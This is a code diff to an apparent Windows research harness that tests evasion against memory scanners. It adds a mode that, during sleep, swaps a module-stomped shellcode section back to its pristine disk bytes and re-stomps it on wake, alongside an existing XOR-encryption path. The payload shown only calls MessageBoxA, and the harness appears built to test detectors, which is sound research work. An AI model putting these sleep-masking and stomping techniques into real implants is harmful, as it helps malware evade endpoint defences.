@@ -45,15 +45,21 @@ typedef struct Shared {
     ULONG     key;
     ULONG     fullEncrypt;
     ULONG     walkFrames;   // 1 = classify stack frames (Elastic-style)
+    ULONG     restoreContent; // 1 = swap .pay to pristine bytes while sleeping
     ULONG     calls;
     ULONG     lastResult;
     ULONG     reserved;
 } Shared;
 
-static volatile Shared g_shared = {0, 0, 0, 8000, 0xA5, 0, 0, 0, 0, 0};
+static volatile Shared g_shared = {0, 0, 0, 8000, 0xA5, 0, 0, 0, 0, 0, 0};
 
 // dual-view (walkmap) handles: [0]=section, [1]=RW view (write alias)
 static HANDLE g_mapHandles[2] = {0, 0};
+
+// content-restore mode: pristine disk image of StompTarget + the stomped
+// shellcode copy, so the sleep engine can swap the page contents
+static unsigned char g_pristinePay[0x9D] = {0};
+static unsigned char g_shellcodeCopy[0x9D] = {0};
 
 static void MarkStage(const char* s); // defined below; used by StubSleep
 
@@ -181,8 +187,18 @@ STB_SEG NOINLINE static void StubSleep(void) {
     const BYTE key = (BYTE)g_shared.key;
 
     MarkStage("stage: stub before encrypt");
-    for (size_t i = 0; i < encLen; i++) {
-        p[i] ^= key; // direct write into the RWX-mapped image section
+    if (g_shared.restoreContent) {
+        // Content-restore mode: put the page back to its pristine disk
+        // image (StompTarget) while sleeping — no ciphertext, no shellcode
+        // bytes, memory == disk. Woken up: re-stomp the shellcode.
+        memcpy(p, g_pristinePay, sizeof(g_pristinePay));
+        MarkStage(memcmp(p, g_pristinePay, sizeof(g_pristinePay)) == 0
+                      ? "stage: restored pristine OK"
+                      : "stage: restore FAILED");
+    } else {
+        for (size_t i = 0; i < encLen; i++) {
+            p[i] ^= key; // direct write into the RWX-mapped image section
+        }
     }
     MarkStage("stage: stub before sleep");
     if (g_shared.walkFrames) {
@@ -191,8 +207,12 @@ STB_SEG NOINLINE static void StubSleep(void) {
     SleepEx(g_shared.sleepMs, FALSE); // <- detector scans the process here
     MarkStage("stage: stub after sleep");
 
-    for (size_t i = 0; i < encLen; i++) {
-        p[i] ^= key;
+    if (g_shared.restoreContent) {
+        memcpy(p, g_shellcodeCopy, sizeof(g_shellcodeCopy));
+    } else {
+        for (size_t i = 0; i < encLen; i++) {
+            p[i] ^= key;
+        }
     }
 
     g_shared.lastResult =
@@ -517,10 +537,15 @@ static int RunExperiment(const wchar_t* mode) {
     memcpy(shell + 0x58, &msgBoxAddr, 8); // slot G (mov rax, imm64)
     printf("[adapt] MessageBoxA = 0x%llX\n", msgBoxAddr);
 
+    // Save the pristine StompTarget image before stomping (content-restore
+    // mode restores it while sleeping, then re-stomps on wake).
+    memcpy(g_pristinePay, (const void*)&StompTarget, sizeof(g_pristinePay));
+
     // Stomp: .pay is linked RWX so this is a plain memcpy (no VirtualProtect
     // anywhere). walkpriv: private RWX buffer. walkmap: RW view (shared pages).
     BYTE* writeTarget = mapmode ? (BYTE*)g_mapHandles[1] : execBase;
     memcpy(writeTarget, shell, sizeof(shell));
+    memcpy(g_shellcodeCopy, shell, sizeof(g_shellcodeCopy));
 
     // self-check: the patched string offsets must match the template layout
     const char* capStr = (const char*)(shellBase + 0x6D);
@@ -543,6 +568,8 @@ static int RunExperiment(const wchar_t* mode) {
     g_shared.fullEncrypt = (wcscmp(mode, L"full") == 0) ? 1 : 0;
     g_shared.walkFrames = (wcscmp(mode, L"walk") == 0 || priv || mapmode) ? 1 : 0;
     g_shared.writeBase = mapmode ? (ULONGLONG)(uintptr_t)g_mapHandles[1] : 0;
+    // content-restore: default island only (walk keeps the classic XOR path)
+    g_shared.restoreContent = (wcscmp(mode, L"island") == 0) ? 1 : 0;
 
     printf("[mode=%ls] pid=%lu StompTarget(shellcode)=%p\n", mode,
            GetCurrentProcessId(), (void*)shellBase);
